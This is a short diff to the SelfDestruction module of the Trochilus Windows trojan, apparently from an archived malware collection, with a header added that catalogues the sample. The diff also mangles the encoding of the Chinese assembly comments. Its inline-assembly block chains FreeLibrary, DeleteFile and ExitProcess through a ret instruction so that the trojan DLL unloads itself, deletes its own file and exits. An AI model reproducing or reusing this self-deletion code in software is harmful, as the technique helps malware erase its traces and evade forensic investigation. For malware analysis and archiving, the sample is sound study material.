@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "SelfDestruction.h"
 
@@ -108,11 +119,11 @@ namespace SelfDestruction
  
  		__asm
  		{
- 			push 0	;²ÎÊý1
+ 			push 0	;ï¿½ï¿½ï¿½ï¿½1
  			push 0
- 			push szDll	;²ÎÊý2
+ 			push szDll	;ï¿½ï¿½ï¿½ï¿½2
  			push ExitProcess
- 			push hDll	;²ÎÊý3
+ 			push hDll	;ï¿½ï¿½ï¿½ï¿½3
  			push DeleteFile
  			push FreeLibrary
  			ret		
